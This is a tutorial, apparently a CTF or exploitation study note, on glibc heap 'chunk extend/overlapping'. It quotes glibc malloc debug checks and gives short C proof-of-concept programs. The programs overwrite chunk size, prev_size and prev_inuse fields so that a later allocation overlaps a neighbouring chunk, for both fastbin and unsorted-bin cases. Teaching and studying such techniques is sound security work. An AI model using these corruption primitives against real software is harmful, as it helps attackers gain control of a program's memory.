# chunk extend/overlapping
In essence, it enlarges the size of the obtained chunk so that it can cover memory that originally did not belong to this chunk (covering other chunks), thereby controlling the contents written to that part of memory

Condition: you can modify the data of the chunk header, and after modification you have another opportunity to malloc a chunk corresponding to the modified size in the corresponding bin. Only then can the modification take effect and ultimately extend the chunk's range

## Backward extend overlapping
Here the size is modified to be larger, so that the chunk's content range expands and can cover higher-address contents
Specifically, it can be divided into two types: modify size first, then free, then malloc; and free first, then modify, then malloc

```c

static void
do_check_remalloced_chunk (mstate av, mchunkptr p, INTERNAL_SIZE_T s)
{
  INTERNAL_SIZE_T sz = p->size & ~(PREV_INUSE | NON_MAIN_ARENA);

  if (!chunk_is_mmapped (p))
    {
      assert (av == arena_for_chunk (p));
      if (chunk_non_main_arena (p))
        assert (av != &main_arena);
      else
        assert (av == &main_arena);
    }

  do_check_inuse_chunk (av, p);

  /* Legal size ... */
  assert ((sz & MALLOC_ALIGN_MASK) == 0);
  assert ((unsigned long) (sz) >= MINSIZE);
  /* ... and alignment */
  assert (aligned_OK (chunk2mem (p)));
  /* chunk is less than MINSIZE more than request */
  assert ((long) (sz) - (long) (s) >= 0);
  assert ((long) (sz) - (long) (s + MINSIZE) < 0);
}
```

 do_check_inuse_chunk (av, p); function
```c
static void
do_check_inuse_chunk (mstate av, mchunkptr p)
{
  mchunkptr next;

  do_check_chunk (av, p);

  if (chunk_is_mmapped (p))
    return; /* mmapped chunks have no next/prev */

  /* Check whether it claims to be in use ... */
  assert (inuse (p));

  next = next_chunk (p);

  /* ... and is surrounded by OK chunks.
     Since more things can be checked with free chunks than inuse ones,
     if an inuse chunk borders them and debug is on, it's worth doing them.
   */
  if (!prev_inuse (p))
    {
      /* Note that we cannot even look at prev unless it is not inuse */
      mchunkptr prv = prev_chunk (p);
      assert (next_chunk (prv) == p);
      do_check_free_chunk (av, prv);
    }

  if (next == av->top)
    {
      assert (prev_inuse (next));
      assert (chunksize (next) >= MINSIZE);
    }
  else if (!inuse (next))
    do_check_free_chunk (av, next);
}
```


###  Modify the header first, then free, then malloc
For **fastbin**
Modify the size of a chunk that can be freed into the fastbin so that it covers the next target chunk; after free and then malloc you can obtain a large chunk that covers the target chunk

```c
#include<stdio.h>
#include <stdlib.h>

int main(void)
{
    void *ptr,*ptr1,*ptr2;

    ptr=malloc(0x10);//分配第一个0x10的chunk

    ptr2=malloc(0x10);//分配第二个0x10的chunk
    //free(ptr2)不影响后面的extend
    *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域

    free(ptr);
    ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容
    printf("控制的地址:%p",ptr1);
    return 0;
}
```
At this point, the 1 in the modified 0x41 is the pre_inuse bit, because setting it to 1 here makes it convenient to bypass the checks

For **non-fastbin**
When freeing a chunk that does not belong to the fastbin and is not adjacent to the top chunk, the chunk is first placed into the unsorted bin. Modify its size so that it covers the next target chunk; after free and then malloc you can obtain a large chunk that covers the target chunk


```c
#include<stdio.h>

#include <stdlib.h>
int main()
{
    void *ptr,*ptr1,*ptr2,*ptr3;

    ptr=malloc(0x80);//分配第一个 0x80 的chunk1
    ptr2=malloc(0x10); //分配第二个 0x10 的chunk2
    ptr3=malloc(0x10); //防止与top chunk合并

    *(int *)(ptr-0x8)=0xb1; //此时覆盖后的下一个chunk为ptr3
    free(ptr);
    ptr1=malloc(0xa0);
    printf("控制的地址为：%p",ptr1);
}
```

### Free first, then modify the header, then malloc
For **fastbin**
Because when a chunk is taken out by malloc after free, its size is checked for correctness, an error will be reported if it has been modified at this point, so this does not work


For **non-fastbin**
When freeing a chunk that does not belong to the fastbin and is not adjacent to the top chunk, the chunk is first placed into the unsorted bin. Free first, then modify the chunk's size, and finally allocate again to achieve overlapping

```c
#include<stdio.h>
#include <stdlib.h>
int main()
{
    void *ptr,*ptr1,*ptr2,*ptr3;

    ptr=malloc(0x80);//分配第一个0x80的chunk1
    ptr2=malloc(0x10);//分配第二个0x10的chunk2

    free(ptr);//首先进行释放，使得chunk1进入unsorted bin

    *(int *)(ptr-0x8)=0xb1;
    ptr1=malloc(0xa0);
    printf("控制的地址为：%p",ptr1);
}
    

```

## Forward extend overlapping
### Exploiting the consolidation mechanism before being placed into the unsorted bin

Forward extend exploits the process of consolidating and then placing the consolidated chunk into the unsorted bin (it must not be adjacent to the top chunk). By modifying the pre_size field, you can span multiple chunks (that is, the previous chunk determined by pre_size and pre_inuse may actually cover multiple actual chunks) and consolidate them to achieve overlapping.

By modifying the current chunk's pre_inuse and pre_size, when the current chunk is freed, the address of the previous chunk determined by pre_size and pre_inuse is checked to see whether it is free; if pre_inuse is 0, consolidation occurs

###  Modify the header first, then free, then malloc

```c
#include<stdio.h>
#include <stdlib.h>
int main(void)
{
    void *ptr1,*ptr2,*ptr3,*ptr4,*ptr5,*ptr6;
    ptr1=malloc(128);//smallbin1
    ptr2=malloc(0x10);//fastbin1
    ptr3=malloc(0x10);//fastbin2
    ptr4=malloc(128);//smallbin2
    ptr5=malloc(0x10);//防止与top合并
    free(ptr1);//使得下个chunk对应的前一个chunk是free的
    *(int *)((long long)ptr4-0x8)=0x90;//修改pre_inuse域
    *(int *)((long long)ptr4-0x10)=0xd0;//修改pre_size域
    free(ptr4);//unlink进行前向extend
    ptr6=malloc(0x150);//得到extend的chunk
    printf("控制的地址为：%p",ptr6);
}

```
### Free first, then modify the header, then malloc
Useless, because consolidation only happens at free time. If you modify after freeing, no consolidation will occur
